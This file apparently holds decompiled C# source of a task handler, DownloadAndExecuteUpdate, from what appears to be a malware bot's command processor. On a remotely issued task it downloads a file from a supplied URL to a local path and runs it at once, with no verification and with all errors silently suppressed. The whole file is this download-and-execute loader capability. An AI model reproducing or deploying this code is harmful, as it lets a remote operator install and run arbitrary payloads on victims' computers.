using System;
using System.Diagnostics;
using System.IO;
using System.Net;

// Token: 0x0200002E RID: 46
public class DownloadAndExecuteUpdate : ITaskProcessor
{
	// Token: 0x060000FB RID: 251 RVA: 0x00003318 File Offset: 0x00001518
	public bool IsValidAction(Entity_UpdateAction action)
	{
		return action == Entity_UpdateAction.Id3;
	}

	// Token: 0x060000FC RID: 252 RVA: 0x00009574 File Offset: 0x00007774
	public bool Process(Entity_Task updateTask)
	{
		try
		{
			string[] array = updateTask.Id2.Split(new string[]
			{
				"|"
			}, StringSplitOptions.RemoveEmptyEntries);
			new WebClient().DownloadFile(array[0], Environment.ExpandEnvironmentVariables(array[1]));
			System.Diagnostics.Process.Start(new ProcessStartInfo
			{
				WorkingDirectory = new FileInfo(Environment.ExpandEnvironmentVariables(array[1])).Directory.FullName,
				FileName = Environment.ExpandEnvironmentVariables(array[1])
			});
		}
		catch (Exception)
		{
			return false;
		}
		return true;
	}
}
